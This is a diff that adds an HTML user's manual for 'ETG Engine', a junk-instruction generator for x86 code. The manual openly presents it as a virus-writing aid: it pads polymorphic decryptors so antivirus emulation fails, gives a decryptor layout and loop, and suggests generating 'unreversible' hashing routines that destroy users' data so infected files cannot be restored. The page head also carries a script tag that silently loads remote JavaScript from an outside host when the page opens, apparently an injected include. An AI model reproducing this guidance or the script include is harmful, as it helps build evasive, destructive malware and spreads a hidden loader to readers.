@@ -1,0 +1,157 @@
+<html>
+<head>
+<title>ETG Engine -- User's Manual</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+</head>
+<body bgcolor=#C0C0C0 text=#000000 link=#0000EE vlink=#551A8B>
+
+<h1 align=center>Executable Trash Generator<br><small>(ETG Engine)</small></h1>
+
+<h3 align=center>version 2.00</h3>
+
+<hr><br>
+<h2 align=center>User's Manual</h2>
+<hr><br>
+
+<h3 align=center>DESCRIPTION</h3>
+
+<p>ETG is an engine used to generate x86 instructions of the given properties.
+
+<p>The following properties of the generic code may be specified:
+
+<ul>
+<li>set of available commands:<br>
+<code>MOV,MOVSX/ZX,XCHG,LEA,ADD/ADC/AND/OR/SUB/SBB/XOR/CMP,
+    INC/DEC,NOT/NEG,TEST,IMUL,ROL/ROR/RCL/RCR/SHL/SAL/SHR/SAR,
+    SHLD/SHRD,BSWAP,XADD,BSF/BSR,BT/BTC/BTR/BTS,JMP,SEG(6),REPZ/NZ</code>
+
+<li>set of source registers:<br>
+    <code>EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</code>
+
+<li>set of destination registers:<br>
+    <code>EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</code>
+</ul>
+
+<p>The 8-bit registers are processed as parts of the 32-bit registers,
+  so when including REG_EAX into destination-register-set, AL and AH will
+  also be used.
+
+<p>16-bit registers are used only as source registers in some instructions,
+  such as MOVSX.
+
+<p>No prefixes 66h/67h are generated.
+
+<h3 align=center>INCLUDING</h3>
+
+<pre>
+  To include ETG into your code, do the following:
+
+    include ETG.INC
+
+    push    offset rnd       ; offset of rnd()
+    push    offset buf       ; offset of the output buffer
+    push    size buf         ; max size of output buffer
+    push    &lt;NCMDS&gt;          ; max number of instructions (max 0x7FFFFFFF)
+    push    offset buf_size  ; resulting bufsize
+    push    REG_EAX+REG_EBX  ; set of destination registers, [REG_xxx]
+    push    REG_ECX+REG_EDX  ; set of source registers, [REG_xxx]
+    push    ETG_ALL-ETG_JMPS ; set of available commands, [ETG_xxx]
+    push    user_param       ; user parameter, passed into rnd()
+    call    etg_engine
+</pre>
+
+<p>As a result, buffer 'buf' is filled with instructions, and DWORD 'buf_size'
+  contains size of the buffer.
+  Number of generated instruction is not more than <NCMDS> parameter,
+  and total size of generated code ('buf_size') is not more than
+  specified maximal buffer size.
+
+<h3 align=center>EXTERNAL RANDOMER</h3>
+
+<p>To allow generating code which depends on only passing parameters and
+  algorithm of random number generator,
+  ETG uses external randomer of the following form:
+
+<pre>
+  DWORD cdecl rnd(DWORD userparam, DWORD range)
+  {
+    ...
+    return x;   // x=[0..range-1]
+  }
+</pre>
+
+<p>Here is an example of such randomer, written in assembler:
+
+<pre>
+randseed        dd      ?
+
+rnd:            mov     eax, randseed
+                imul    eax, 214013
+                add     eax, 2531011
+                mov     randseed, eax
+                shr     eax, 16
+                imul    eax, [esp+8]
+                shr     eax, 16
+                ret
+</pre>
+
+<p>So, the rnd() subroutine may be called as following:
+
+<pre>
+                push    100             ; range
+                push    12345678h       ; user-param
+                call    rnd
+                add     esp, 8
+                ; eax=0..99
+</pre>
+
+<h3 align=center>FEATURES</h3>
+
+<p>Code of the ETG Engine is offset-independent, so it may be displaced
+  and even permutated.
+  The 'etg_engine' subroutine is written in pascal-style, so it clears
+  all parameters from the stack when returning to caller.
+  All registers are saved.
+  Flags are modified, and DF is cleared (CLD).
+
+<h3 align=center>Where it can be used?</h3>
+
+<ul>
+<li>ETG may be used to generate trash, which is placed between polymorphic
+    decryptor and your code, so after emulating decryptor AV will suck.
+
+<pre>
+  [HOST FILE]
+  [POLYMORPHIC DECRYPTOR]
+   -->[TRASH] (encrypted) //etg(bufsize=1024,regs=REG_ALL,cmds=ETG_ALL)
+       -->[VIRUS] (encrypted)
+</pre>
+
+<li>ETG may be called from some polymorphic engine, to generate trash between
+    really decrypting instructions.
+    (specify NCMDS=1 and ETG will generate single instructions)
+
+<pre>
+        ...                     <font color=#000080>; etg(dst=REG_ALL,src=REG_ALL,ETG_ALL)</font>
+        mov     r1, offset virus
+        ...                     <font color=#000080>; etg(dst=REG_ALL-r1,...)</font>
+        mov     r2, virus_size
+        ...                     <font color=#000080>; etg(dst=REG_ALL-r1-r2,...)</font>
+c1:     not     byte ptr [r1]
+        ...                     <font color=#000080>; --//--</font>
+        inc     r1
+        ...                     <font color=#000080>; --//--</font>
+        dec     r2
+        ...                     <font color=#000080>; --//--</font>
+        jnz     c1
+        ...                     <font color=#000080>; etg(dst=REG_ALL,...)</font>
+</pre>
+
+<li>ETG may be used to generate some unreversible "hashing" subroutines.
+    In this case you should kill some user's data and use hash,
+    so no one will be able to restore infected objects completely.
+</ul>
+
+<hr><br>
+
+<center>
+<address>
